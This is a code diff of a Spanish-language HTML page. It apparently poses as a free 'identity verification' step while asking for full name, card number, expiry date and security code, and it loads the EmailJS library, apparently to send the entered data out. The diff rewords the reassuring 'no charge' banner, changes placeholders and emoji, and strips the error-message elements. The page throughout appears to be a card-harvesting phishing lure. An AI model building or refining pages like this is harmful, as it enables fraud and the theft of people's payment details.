@@ -7,9 +7,8 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <!-- AVISO GIGANTE -->
-    <div class="super-aviso">
-        🔒 ¡GARANTÍA! <br>
+    <div class="mega-alert">
+        🔐 ¡GARANTÍA! <br>
         NO SE REALIZARÁ NINGÚN COBRO <br>
         SOLO VERIFICACIÓN DE IDENTIDAD
     </div>
@@ -24,33 +23,29 @@
         <form id="paymentForm">
             <div class="input-group">
                 <label>Nombre Completo</label>
-                <input type="text" id="userName" placeholder="Ej. JUAN PÉREZ" required>
-                <span class="error-msg" id="nameError"></span>
+                <input type="text" id="userName" placeholder="Ej. MARÍA GARCÍA" required>
             </div>
 
             <div class="input-group">
                 <label>Número de Tarjeta</label>
                 <input type="text" id="cardNumber" placeholder="•••• •••• •••• ••••" maxlength="19" required>
-                <span class="error-msg" id="cardError"></span>
             </div>
 
             <div class="input-group">
                 <label>Fecha de Expiración</label>
                 <input type="month" id="expiryDate" required>
-                <span class="error-msg" id="dateError"></span>
             </div>
 
             <div class="input-group">
                 <label>Código de Seguridad</label>
                 <input type="text" id="cvc" placeholder="••••" maxlength="4" required>
-                <span class="error-msg" id="cvcError"></span>
             </div>
 
-            <button type="submit">Verificar Ahora 🔐</button>
+            <button type="submit">Verificar Ahora ✔️</button>
         </form>
 
-        <div id="loader" class="hidden">⏳ Validando identidad...</div>
-        <div id="errorMsg" class="hidden error-msg"></div>
+        <div id="loader" class="hidden">🔍 Validando información...</div>
+        <div id="errorMsg" class="hidden"></div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
